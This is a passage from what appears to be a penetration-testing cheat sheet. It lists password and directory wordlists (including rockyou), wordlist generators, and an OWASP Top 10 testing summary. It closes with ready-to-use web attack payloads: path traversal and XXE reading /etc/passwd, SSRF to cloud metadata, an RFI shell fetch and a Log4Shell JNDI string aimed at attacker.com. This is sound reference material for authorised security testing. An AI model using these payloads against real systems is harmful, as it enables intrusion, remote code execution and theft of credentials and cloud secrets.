/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt    # 14M passwords
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Kali Linux built-in
/usr/share/wordlists/rockyou.txt          # must gunzip first: gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/dirbuster/           # directory wordlists
/usr/share/wordlists/fasttrack.txt        # small passwords list

# Generate custom wordlists
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt  # all 8-char combos
cewl http://example.com -d 3 -m 5 -w wordlist.txt   # scrape words from website
cupp -i                                               # interactive user-specific wordlist generator
```

## OWASP Top 10 — Testing Reference

1. Broken Access Control — test IDOR, path traversal, privilege escalation.
2. Cryptographic Failures — check for HTTP, weak TLS, MD5/SHA1 hashing, unencrypted data.
3. Injection — SQLi, XSS, command injection, LDAP injection, XXE.
4. Insecure Design — missing rate limiting, no MFA, weak session management.
5. Security Misconfiguration — default credentials, directory listing, verbose errors, unused features.
6. Vulnerable Components — check dependencies against CVE databases.
7. Authentication Failures — brute force, credential stuffing, weak passwords, no lockout.
8. SSRF — make server fetch internal URLs: localhost, 169.254.169.254 (AWS metadata).
9. Security Logging Failures — verify security events are logged.
10. Client-Side Request Forgery — CSRF tokens absent.

Common vulnerability testing payloads:
```
Path traversal:    ../../../etc/passwd   ..\..\..\windows\win.ini
LFI:               /page?file=../../etc/passwd   /page?file=php://filter/read=convert.base64-encode/resource=index.php
RFI:               /page?file=http://attacker.com/shell.php
XXE:               <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
SSRF:              ?url=http://localhost/admin   ?url=http://169.254.169.254/latest/meta-data/
Open redirect:     /redirect?url=https://evil.com
SSTI (Jinja2):     {{7*7}}   {{config}}   {{self.__class__.__mro__[1].__subclasses__()}}
Log4Shell:         ${jndi:ldap://attacker.com/a}
```
